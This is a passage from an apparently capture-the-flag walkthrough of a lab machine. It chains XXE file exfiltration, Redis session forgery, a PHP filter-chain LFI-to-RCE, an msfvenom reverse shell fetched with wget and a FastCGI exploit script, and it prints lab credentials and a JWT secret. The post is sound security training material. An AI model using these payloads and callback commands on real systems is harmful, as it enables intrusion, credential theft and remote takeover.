</pre></table></code></div></div><p>What I am doing here is appending an external entity in <code class="language-plaintext highlighter-rouge">evil.dtd</code> which is hosted on my end and exfiltrates data back in the form of a get request to my system.</p><p><img data-src="https://i.imgur.com/cAoW66V.png" alt="" data-proofer-ignore></p><p>Upon sending the request, it works! It is indeed vulnerable to XXE! The next issue is that we need to actually exfiltrate meaningful data. We know this is a PHP site since we have the cookie <code class="language-plaintext highlighter-rouge">PHPSESSID</code> so there is no reason for <code class="language-plaintext highlighter-rouge">index.php</code> to not be found unless we need to bypass some sort of filter. Well we can try just that with this new payload here. We just need to use a PHP filer instead.</p><div class="language-jsx highlighter-rouge"><div class="code-header"> <span data-label-text="Jsx"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="p">&lt;</span><span class="err">!</span><span class="na">ENTITY</span> <span class="err">%</span> <span class="na">file</span> <span class="na">SYSTEM</span> <span class="s">"php://filter/convert.base64-encode/resource=index.php"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="err">!</span><span class="na">ENTITY</span> <span class="err">%</span> <span class="na">eval</span> <span class="s">"&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http://10.10.14.137/?x=%file;'&gt;"</span><span class="p">&gt;</span>
%eval;
%exfiltrate;
</pre></table></code></div></div><p><img data-src="https://i.imgur.com/okw4qpW.png" alt="" data-proofer-ignore></p><p>Bingo we get a hit! All we need to do is base64 decode this data and we get the contents of <code class="language-plaintext highlighter-rouge">index.php</code>.</p><blockquote class="prompt-danger"><div><p>Wait wait wait, what’s going on?</p><p>Let me try to explain what happened here. I sent in a valid post request utilizing an actual API request from earlier but appended the external entity into it. This is in the line: <code class="language-plaintext highlighter-rouge">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "http://10.10.14.137/evil.dtd"&gt; %xxe;]&gt;</code> This calls back to my webserver and loads in a file, <code class="language-plaintext highlighter-rouge">index.php</code> and sends it to my webserver again through the URL. So that base64 output you are seeing, that’s the <code class="language-plaintext highlighter-rouge">index.php</code> page encoded and sent straight back to me.</p></div></blockquote><h3 id="interesting-files"><span class="mr-2">Interesting Files</span><a href="#interesting-files" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>

<span class="k">require</span> <span class="s1">'../bootstrap.php'</span><span class="p">;</span>

<span class="kn">use</span> <span class="nc">app\classes\Routes</span><span class="p">;</span>
<span class="kn">use</span> <span class="nc">app\classes\Uri</span><span class="p">;</span>

<span class="nv">$routes</span> <span class="o">=</span> <span class="p">[</span>
    <span class="s2">"/"</span> <span class="o">=&gt;</span> <span class="s2">"controllers/index.php"</span><span class="p">,</span>
    <span class="s2">"/login"</span> <span class="o">=&gt;</span> <span class="s2">"controllers/login.php"</span><span class="p">,</span>
    <span class="s2">"/register"</span> <span class="o">=&gt;</span> <span class="s2">"controllers/register.php"</span><span class="p">,</span>
    <span class="s2">"/home"</span> <span class="o">=&gt;</span> <span class="s2">"controllers/home.php"</span><span class="p">,</span>
    <span class="s2">"/admin"</span> <span class="o">=&gt;</span> <span class="s2">"controllers/admin.php"</span><span class="p">,</span>
    <span class="s2">"/api"</span> <span class="o">=&gt;</span> <span class="s2">"controllers/api.php"</span><span class="p">,</span>
    <span class="s2">"/set/role/admin"</span> <span class="o">=&gt;</span> <span class="s2">"controllers/set_role_admin.php"</span><span class="p">,</span>
    <span class="s2">"/logout"</span> <span class="o">=&gt;</span> <span class="s2">"controllers/logout.php"</span>
<span class="p">];</span>

<span class="nv">$uri</span> <span class="o">=</span> <span class="nc">Uri</span><span class="o">::</span><span class="nf">load</span><span class="p">();</span>
<span class="k">require</span> <span class="nc">Routes</span><span class="o">::</span><span class="nf">load</span><span class="p">(</span><span class="nv">$uri</span><span class="p">,</span> <span class="nv">$routes</span><span class="p">);</span>
</pre></table></code></div></div><p>Lets analyze some of these files. First off we have the index page. Looks like we had some PHP routing in place. The <code class="language-plaintext highlighter-rouge">bootstrap.php</code> might be interesting. File dependencies tend to yield information. I do also want to point out that there might be a character limit or something preventing the full file to be loaded as if you take a look at the PHP file, there is no ending <code class="language-plaintext highlighter-rouge">?&gt;</code>.</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="nb">ini_set</span><span class="p">(</span><span class="s1">'session.save_handler'</span><span class="p">,</span><span class="s1">'redis'</span><span class="p">);</span>
<span class="nb">ini_set</span><span class="p">(</span><span class="s1">'session.save_path'</span><span class="p">,</span><span class="s1">'tcp://127.0.0.1:6379/?auth=COLLECTR3D1SPASS'</span><span class="p">);</span>

<span class="nb">session_start</span><span class="p">();</span>

<span class="k">require</span> <span class="s1">'../vendor/autoload.php'</span><span class="p">;</span>
</pre></table></code></div></div><p>Would you look at that, credentials for the Redis database from earlier. There is also an <code class="language-plaintext highlighter-rouge">autoload.php</code> however, upon looking into it, there is nothing interesting there.</p><blockquote class="prompt-info"><div><p>Info</p><p>1002:victor collect.htb developers.collect.htb forum.collect.htb</p></div></blockquote><p>This information comes from <code class="language-plaintext highlighter-rouge">/etc/group</code> and <code class="language-plaintext highlighter-rouge">/etc/hosts</code> respectively. Most importantly, we have a potential user of interest in Victor. Oddly enough, I didn’t see any users with id 1000 or 1001.</p><p>Looking back earlier, we still haven’t really tried the developers site just yet. With file read capabilities, we may be able to find credentials if we are lucky. My best guess is to try to find an <code class="language-plaintext highlighter-rouge">.htaccess</code> file commonly located within the <code class="language-plaintext highlighter-rouge">/var/www/YOU_DOMAIN/.htaccess</code> as pointed out by <a href="https://www.digitalocean.com/community/tutorials/how-to-use-the-htaccess-file">Digital Ocean</a>.</p><video width="100%" controls=""> <source src="/assets/vid/pollution1.mp4" type="video/mp4" /> </video><p>My suspicions were correct, there is an <code class="language-plaintext highlighter-rouge">.htaccess</code> file for this domain. The decoded contents only contain <code class="language-plaintext highlighter-rouge">Options -Indexes</code> which just prevents directory listing and throws a 403 error instead which makes sense as earlier during the fuzzing, that was the error I received. Oddly enough, there is no mention of authentication in this file but it may be a result of being unable to load the full file as we have been seeing earlier. Regardless, its still worth a shot to find a <code class="language-plaintext highlighter-rouge">.htpasswd</code> file either in this directory or up somewhere apache2 is installed.</p><p><img data-src="https://i.imgur.com/nvM7kma.png" alt="" data-proofer-ignore></p><p>This payload worked and we have the contents of the <code class="language-plaintext highlighter-rouge">.htpasswd</code> file. The username is <code class="language-plaintext highlighter-rouge">developers_group</code> and the password can hopefully be cracked using a tool like <code class="language-plaintext highlighter-rouge">john</code>. I tried Hashcat however, it wouldn’t take the hash.</p><p>Command: <code class="language-plaintext highlighter-rouge">john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><blockquote class="prompt-info"><div><p>Info</p><p>developers_group:$apr1$MzKA5yXY$DwEz.jxW9USWo8.goD7jY1 developers_group:r0cket</p></div></blockquote><p>With the developers site password and the Redis database password, we should have enough information from XXE to move on.</p><h2 id="developers-site-1"><span class="mr-2">Developers site</span><a href="#developers-site-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><img data-src="https://i.imgur.com/SRI4dBM.png" alt="" data-proofer-ignore></p><p>New site new login page, again. Reusing any of the creds earlier fails here. I let SQLmap run against this however, nothing was found. I’ll be returning to this site later with either creds or an alternate way to bypass the login page.</p><p>Since I can’t get any authentication going, best I can do is retrieve some files.</p><blockquote class="prompt-info"><div><p>Info</p><p>if (!isset($_SESSION[‘auth’]) or $_SESSION[‘auth’] != True) This section in the <code class="language-plaintext highlighter-rouge">index.php</code> sticks out to me. We’ll revisit this later.</p></div></blockquote><h2 id="redis-database"><span class="mr-2">Redis Database</span><a href="#redis-database" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li><strong>Quick Redis Cheat Sheet</strong><br /> <code class="language-plaintext highlighter-rouge">PING</code>: Responds with PONG if you are authenticated <br /> <code class="language-plaintext highlighter-rouge">INFO KEYSPACE</code>: Information regarding keys <br /> <code class="language-plaintext highlighter-rouge">KEYS *</code>: Shows all keys<br /> <code class="language-plaintext highlighter-rouge">GET &lt;KEY&gt;</code>: Outputs the information stored in the key<br /> <code class="language-plaintext highlighter-rouge">SET &lt;KEY&gt;</code>: Change key value</ul><p><em>First time using a Redis database, I used mainly these commands</em></p><p><img data-src="https://i.imgur.com/SE1htwn.png" alt="Database keys" data-proofer-ignore></p><p>Credentials are valid and here we were able to spill some information. Those 2 keys that popped up are my <code class="language-plaintext highlighter-rouge">PHPSESSID</code> values. the one with <code class="language-plaintext highlighter-rouge">8sod</code> was the one I’ve been using for the main site and the <code class="language-plaintext highlighter-rouge">mrr3</code> is the new session ID I got for the dev site.</p><p><img data-src="https://i.imgur.com/DaX24bb.png" alt="Key contents" data-proofer-ignore></p><p>As we can see, these are the key contents of the associated <code class="language-plaintext highlighter-rouge">PHPSESSID</code> values. If anyone isn’t familiar with this layout, this is just a serialized PHP string.</p><blockquote class="prompt-danger"><div><p>What’s a PHPSESSID and why is this important?</p><p>A <code class="language-plaintext highlighter-rouge">PHPSESSID</code> is a cookie commonly given out most if not all PHP sites. These are session identifiers that correspond with a actual data on the back end that stores information such as your username or even an email associated with your account. Note that this value is just an identifier— an arbitrary value. In this Redis database however, we are able to see the values of the cookie and even manipulate meaning we can create our own cookie with its own set values.</p></div></blockquote><blockquote class="prompt-warning"><div><p>How can we abuse this?</p><p>Well, if we can sign cookies with any value, it would be possible to spin up a “session” for an account that doesn’t exist and possibly even bypass authentication such as the one seen on the <code class="language-plaintext highlighter-rouge">/login.php</code> of the developers site.</p></div></blockquote><h2 id="revisiting-developers-subdomain"><span class="mr-2">Revisiting Developers Subdomain</span><a href="#revisiting-developers-subdomain" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="bypassing-authentication"><span class="mr-2">Bypassing Authentication</span><a href="#bypassing-authentication" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The information in our admin cookie is as follows: <code class="language-plaintext highlighter-rouge">"username|s:4:\"bruh\";role|s:5:\"admin\";"</code> Currently, the cookie we have for the dev site is empty. Looking back onto the <code class="language-plaintext highlighter-rouge">index.php</code>, we see that the session cookie needs to contain an “auth” value and set to be “True” in order to gain access to the site. We can set our cookie in the Redis database and refresh our page to get through. Take a look at this demo:</p><video width="100%" controls=""> <source src="/assets/vid/pollution2.mp4" type="video/mp4" /> </video><p><img data-src="https://i.imgur.com/J3L0385.png" alt="The index of the dev site" data-proofer-ignore></p><p>Looks like we are in! Every page here seems to be static but there is one key thing to take note of here.</p><h3 id="php-lfi--rce-chain"><span class="mr-2">PHP LFI → RCE Chain</span><a href="#php-lfi--rce-chain" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p><img data-src="https://i.imgur.com/qBGMwhr.png" alt="URL of the site" data-proofer-ignore></p><blockquote class="prompt-warning"><div><p>Vulnerability</p><p>Possible LFI on a PHP site! LFI → PHP RCE Chain is a valid candidate to test.</p></div></blockquote><p>Initial tests with standard LFI payloads is not displaying anything but since this is a PHP site, I jumped the gun and went straight for the chain. There is a nice <a href="https://github.com/synacktiv/php_filter_chain_generator">tool</a> that can generate chains for us and this was the the command I used:</p><p>Command: <code class="language-plaintext highlighter-rouge">python3 [lfi.py](http://lfi.py/) --chain '&lt;?php system("whoami"); ?&gt;'</code></p><p><img data-src="https://i.imgur.com/atuZhIH.png" alt="" data-proofer-ignore></p><p>Look at that! We have command execution! Unless there is a firewall in our way, shell is just across the horizon.</p><p><img data-src="https://i.imgur.com/29F0Wyz.png" alt="" data-proofer-ignore></p><p>We have a road block. The command chains I am passing through are becoming too long for the server to handle. Attempting to run a bash reverse shell contains too many characters. Even something like this is too long when chained: <code class="language-plaintext highlighter-rouge">&lt;?php system("wget [http://10.10.14.152/a](http://10.10.14.152/a)"); ?&gt;</code></p><p>We need to find a way to shorten this code to allow myself to upload a shell. Apparently in PHP, as I was just taught from ChatGPT, <code class="language-plaintext highlighter-rouge">system</code> commands can be shorted by using ``` instead. The <code class="language-plaintext highlighter-rouge">&lt;?php</code> can also be shortened with <code class="language-plaintext highlighter-rouge">&lt;?=</code> to save 2 characters. You can also remove the <code class="language-plaintext highlighter-rouge">http://</code> in the wget request.</p><p>With this chain of commands, I was able to get RCE:</p><ul><li><p>Create msfvenom payload <code class="language-plaintext highlighter-rouge">msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.152 LPORT=4444 -f elf &gt; a</code></p><li><p>Drop payload on disk <code class="language-plaintext highlighter-rouge">wget 10.10.14.152/a -O /tmp/a</code></p><li><p>Change permissions <code class="language-plaintext highlighter-rouge">chmod 777 /tmp/a</code></p><li><p>Activate <code class="language-plaintext highlighter-rouge">/tmp/a</code></p></ul><p>With all that, we finally have access to the network :)</p><h1 id="pivot-www-data--victor">Pivot: www-data → Victor</h1><hr /><h2 id="basic-enumeration"><span class="mr-2">Basic Enumeration</span><a href="#basic-enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><img data-src="https://i.imgur.com/5dOuQ1K.png" alt="list files output" data-proofer-ignore></p><p>Interestingly enough, despite our file read through XXE earlier, we couldn’t read <code class="language-plaintext highlighter-rouge">login.php</code> despite it existing. Here is the interesting part of it though:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">mysqli</span><span class="p">(</span><span class="s2">"localhost"</span><span class="p">,</span> <span class="s2">"webapp_user"</span><span class="p">,</span> <span class="s2">"Str0ngP4ssw0rdB*12@1"</span><span class="p">,</span> <span class="s2">"developers"</span><span class="p">);</span>
<span class="nv">$db</span><span class="o">-&gt;</span><span class="nf">set_charset</span><span class="p">(</span><span class="s1">'utf8mb4'</span><span class="p">);</span>
</pre></table></code></div></div><blockquote class="prompt-tip"><div><p>We have plaintext credentials!!</p><p>webapp_user:Str0ngP4ssw0rdB*12@1</p></div></blockquote><p>Credentials obtained and noted. Next up is where to use them.</p><p><img data-src="https://i.imgur.com/r1bVzIB.png" alt="List listening ports" data-proofer-ignore></p><p><code class="language-plaintext highlighter-rouge">netstat -tulpn</code> shows us quite a bit of information on this box actually. 3306 is expected as we have database credentials so I’ll be enumerating that shortly. There is also a port 9000 which I never seen before as well as 3000 which might be either Werkzeug, GitTea, a proxy of some sort, or something else.</p><h3 id="mariadb-3306tcp"><span class="mr-2">MariaDB (3306/tcp)</span><a href="#mariadb-3306tcp" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-jsx highlighter-rouge"><div class="code-header"> <span data-label-text="Jsx"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="nx">MariaDB</span> <span class="p">[(</span><span class="nx">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="nx">show</span> <span class="nx">databases</span><span class="p">;</span>
<span class="nx">show</span> <span class="nx">databases</span><span class="p">;</span>
<span class="o">+--------------------+</span>
<span class="o">|</span> <span class="nx">Database</span>           <span class="o">|</span>
<span class="o">+--------------------+</span>
<span class="o">|</span> <span class="nx">developers</span>         <span class="o">|</span>
<span class="o">|</span> <span class="nx">forum</span>              <span class="o">|</span>
<span class="o">|</span> <span class="nx">information_schema</span> <span class="o">|</span>
<span class="o">|</span> <span class="nx">mysql</span>              <span class="o">|</span>
<span class="o">|</span> <span class="nx">performance_schema</span> <span class="o">|</span>
<span class="o">|</span> <span class="nx">pollution_api</span>      <span class="o">|</span>
<span class="o">|</span> <span class="nx">webapp</span>             <span class="o">|</span>
<span class="o">+--------------------+</span>
<span class="mi">7</span> <span class="nx">rows</span> <span class="k">in</span> <span class="kd">set</span> <span class="p">(</span><span class="mf">0.001</span> <span class="nx">sec</span><span class="p">)</span>
</pre></table></code></div></div><p>MariaDB seems to house many databases. Many of which seem to belong to the various domains on the machine. Developers contains an admin user whos password hash remained uncrackable. Forum contains password hashes and salts for Victor, the user of interest, among many others yet none were crackable either. Webapp was the main site. pollution_api seems pretty empty with empty users and empty messages. Though considering the box name, we may be revisiting this later.</p><h3 id="expressjs-api-3000tcp"><span class="mr-2">ExpressJS API (3000/tcp)</span><a href="#expressjs-api-3000tcp" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>This port happened to just be a API handler. I looked back into the source code of some of the pages we used earlier like <code class="language-plaintext highlighter-rouge">bootstrap.php</code> and it mentioned curling requests to port 3000. I guess this is where that comes into play. As of right now we can’t really do much. It requires authentication to play with its functionality and there’s no leads there.</p><h3 id="fastcgi-9000tcp"><span class="mr-2">FastCGI (9000/tcp)</span><a href="#fastcgi-9000tcp" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>First time seeing this port open. Hacktricks seems to have an article on this port so I will be testing that out shortly. I also found that by running linpeas under the cleaned processes tab, I saw this:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">victor</span>      <span class="mi">1113</span>  <span class="mf">0.0</span>  <span class="mf">0.3</span> <span class="mi">265840</span> <span class="mi">15836</span> <span class="o">?</span>        <span class="nc">S</span>    <span class="nc">Mar10</span>   <span class="mi">0</span><span class="o">:</span><span class="mo">00</span>  <span class="n">_</span> <span class="n">php</span><span class="o">-</span><span class="n">fpm</span><span class="o">:</span> <span class="n">pool</span> <span class="n">victor</span>                                                                      
<span class="n">victor</span>      <span class="mi">1114</span>  <span class="mf">0.0</span>  <span class="mf">0.3</span> <span class="mi">265840</span> <span class="mi">15836</span> <span class="o">?</span>        <span class="nc">S</span>    <span class="nc">Mar10</span>   <span class="mi">0</span><span class="o">:</span><span class="mo">00</span>  <span class="n">_</span> <span class="n">php</span><span class="o">-</span><span class="n">fpm</span><span class="o">:</span> <span class="n">pool</span> <span class="n">victor</span>
</pre></table></code></div></div><p>php-fpm is FastCGI Process Manager so this should confirm what the port 9000 is. That being said, time to test the <a href="https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi">Hacktricks</a> payloads.</p><p>This was the payload I ended up using. No need to create a long reverse shell payload if I know this is run as Victor. I can just reuse the payload I dropped earlier.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="nv">PAYLOAD</span><span class="o">=</span><span class="s2">"&lt;?php echo '&lt;!--'; system('/tmp/a'); echo '--&gt;';"</span>
<span class="nv">FILENAMES</span><span class="o">=</span><span class="s2">"/var/www/developers/index.php"</span> <span class="c"># Exisiting file path</span>

<span class="nv">HOST</span><span class="o">=</span><span class="nv">$1</span>
<span class="nv">B64</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$PAYLOAD</span><span class="s2">"</span>|base64<span class="si">)</span>

<span class="k">for </span>FN <span class="k">in</span> <span class="nv">$FILENAMES</span><span class="p">;</span> <span class="k">do
    </span><span class="nv">OUTPUT</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span><span class="si">)</span>
    <span class="nb">env</span> <span class="nt">-i</span> <span class="se">\</span>
      <span class="nv">PHP_VALUE</span><span class="o">=</span><span class="s2">"allow_url_include=1"</span><span class="s1">$'</span><span class="se">\n</span><span class="s1">'</span><span class="s2">"allow_url_fopen=1"</span><span class="s1">$'</span><span class="se">\n</span><span class="s1">'</span><span class="s2">"auto_prepend_file='data://text/plain</span><span class="se">\;</span><span class="s2">base64,</span><span class="nv">$B64</span><span class="s2">'"</span> <span class="se">\</span>
      <span class="nv">SCRIPT_FILENAME</span><span class="o">=</span><span class="nv">$FN</span> <span class="nv">SCRIPT_NAME</span><span class="o">=</span><span class="nv">$FN</span> <span class="nv">REQUEST_METHOD</span><span class="o">=</span>POST <span class="se">\</span>
      cgi-fcgi <span class="nt">-bind</span> <span class="nt">-connect</span> <span class="nv">$HOST</span>:9000 &amp;&gt; <span class="nv">$OUTPUT</span>

    <span class="nb">cat</span> <span class="nv">$OUTPUT</span>
<span class="k">done</span>
</pre></table></code></div></div><p>After running this bash script, we are in as Victor.</p><h1 id="privesc-victor--root">Privesc: Victor → Root</h1><hr /><h2 id="basic-enumeration-1"><span class="mr-2">Basic Enumeration</span><a href="#basic-enumeration-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><img data-src="https://i.imgur.com/5DEvyhD.png" alt="" data-proofer-ignore></p><p>Seems like Victor is the owner of the pollution_api. I guess this is the API that they have been advertising on their main site.</p><p><img data-src="https://i.imgur.com/woemSw7.png" alt="Revisiting the forum post" data-proofer-ignore></p><p>It’s pretty neat to see that this was hinted at so early into the box. The premise for the box is fairly consistent.</p><p>Revisiting the line earlier spit out by linpeas strikes me as interesting:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>root    1364  0.0  1.8 1663556 75120  /usr/bin/node /root/pollution_api/index.js
</pre></table></code></div></div><p>Although the process is run as root, it’s Victor, our current user, who is the owner of the file. Regardless, lets take a look at the API’s source code.</p><p><code class="language-plaintext highlighter-rouge">routes/documentation.js</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
</pre><td class="rouge-code"><pre>const express <span class="o">=</span> require<span class="o">(</span><span class="s1">'express'</span><span class="o">)</span><span class="p">;</span>
const router <span class="o">=</span> express.Router<span class="o">()</span><span class="p">;</span>

router.get<span class="o">(</span><span class="s1">'/'</span>,<span class="o">(</span>req,res<span class="o">)=&gt;{</span>
    res.json<span class="o">({</span>
        Documentation: <span class="o">{</span>
            Routes: <span class="o">{</span>
                <span class="s2">"/"</span>: <span class="o">{</span>
                    Methods: <span class="s2">"GET"</span>,
                    Params: null
                <span class="o">}</span>,
                <span class="s2">"/auth/register"</span>: <span class="o">{</span>
                    Methods: <span class="s2">"POST"</span>,
                    Params: <span class="o">{</span>
                        username: <span class="s2">"user"</span>,
                        password: <span class="s2">"pass"</span>
                    <span class="o">}</span>
                <span class="o">}</span>,
                <span class="s2">"/auth/login"</span>: <span class="o">{</span>
                    Methods: <span class="s2">"POST"</span>,
                    Params: <span class="o">{</span>
                        username: <span class="s2">"user"</span>,
                        password: <span class="s2">"pass"</span>
                    <span class="o">}</span>
                <span class="o">}</span>,
                <span class="s2">"/client"</span>: <span class="o">{</span>
                    Methods: <span class="s2">"GET"</span>,
                    Params: null
                <span class="o">}</span>,
                <span class="s2">"/admin/messages"</span>: <span class="o">{</span>
                    Methods: <span class="s2">"POST"</span>,
                    Params: <span class="o">{</span>
                        <span class="nb">id</span>: <span class="s2">"messageid"</span>
                    <span class="o">}</span>
                <span class="o">}</span>,
                <span class="s2">"/admin/messages/send"</span>: <span class="o">{</span>
                    Methods: <span class="s2">"POST"</span>,
                    Params: <span class="o">{</span>
                        text: <span class="s2">"message text"</span>
                    <span class="o">}</span>
                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">}</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">functions/jwt.js</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>const jwt <span class="o">=</span> require<span class="o">(</span><span class="s1">'jsonwebtoken'</span><span class="o">)</span><span class="p">;</span>
const SECRET <span class="o">=</span> <span class="s2">"JWT_COLLECT_124_SECRET_KEY"</span>

const signtoken <span class="o">=</span> <span class="o">(</span>payload<span class="o">)=&gt;{</span>
    const token <span class="o">=</span> jwt.sign<span class="o">(</span>payload, SECRET, <span class="o">{</span> expiresIn: 3600 <span class="o">})</span><span class="p">;</span>
    <span class="k">return </span>token<span class="p">;</span>
<span class="o">}</span>

const decodejwt <span class="o">=</span> <span class="o">(</span>token<span class="o">)=&gt;{</span>
    <span class="k">return </span>jwt.verify<span class="o">(</span>token, SECRET, <span class="o">(</span>err, decoded<span class="o">)=&gt;{</span>
        <span class="k">if</span><span class="o">(</span>err<span class="o">)</span> <span class="k">return </span><span class="nb">false</span><span class="p">;</span>
        <span class="k">return </span>decoded<span class="p">;</span>
    <span class="o">})</span><span class="p">;</span>
<span class="o">}</span>

module.exports <span class="o">=</span> <span class="o">{</span> signtoken, decodejwt<span class="o">}</span><span class="p">;</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">routes/auth.js</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre>const express <span class="o">=</span> require<span class="o">(</span><span class="s1">'express'</span><span class="o">)</span><span class="p">;</span>
const router <span class="o">=</span> express.Router<span class="o">()</span><span class="p">;</span>
const User <span class="o">=</span> require<span class="o">(</span><span class="s1">'../models/User'</span><span class="o">)</span><span class="p">;</span>
const <span class="o">{</span> decodejwt <span class="o">}</span> <span class="o">=</span> require<span class="o">(</span><span class="s1">'../functions/jwt'</span><span class="o">)</span>

//controllers
const <span class="o">{</span> messages <span class="o">}</span> <span class="o">=</span> require<span class="o">(</span><span class="s1">'../controllers/Messages'</span><span class="o">)</span><span class="p">;</span>
const <span class="o">{</span> messages_send <span class="o">}</span> <span class="o">=</span> require<span class="o">(</span><span class="s1">'../controllers/Messages_send'</span><span class="o">)</span><span class="p">;</span>

router.use<span class="o">(</span><span class="s1">'/'</span>, async<span class="o">(</span>req,res,next<span class="o">)=&gt;{</span>
    <span class="k">if</span><span class="o">(</span>req.headers[<span class="s2">"x-access-token"</span><span class="o">]){</span>
        const token <span class="o">=</span> decodejwt<span class="o">(</span>req.headers[<span class="s2">"x-access-token"</span><span class="o">])</span><span class="p">;</span>
        <span class="k">if</span><span class="o">(</span>token<span class="o">){</span>
            const find <span class="o">=</span> await User.findAll<span class="o">({</span>where: <span class="o">{</span>username: token.user, role: token.role<span class="o">}})</span><span class="p">;</span>           
            <span class="k">if</span><span class="o">(</span>find.length <span class="o">&gt;</span> 0<span class="o">){</span>
                <span class="k">if</span><span class="o">(</span>find[0].username <span class="o">==</span> token.user <span class="o">&amp;&amp;</span> find[0].role <span class="o">==</span> token.role <span class="o">&amp;&amp;</span> token.role <span class="o">==</span> <span class="s2">"admin"</span><span class="o">){</span>
                    <span class="k">return </span>next<span class="o">()</span><span class="p">;</span>
                <span class="o">}</span>
                <span class="k">return </span>res.json<span class="o">({</span>Status: <span class="s2">"Error"</span>, Message: <span class="s2">"You are not allowed"</span><span class="o">})</span><span class="p">;</span>
            <span class="o">}</span>
            <span class="k">return </span>res.json<span class="o">({</span>Status: <span class="s2">"Error"</span>, Message: <span class="s2">"You are not allowed"</span><span class="o">})</span><span class="p">;</span>
        <span class="o">}</span>
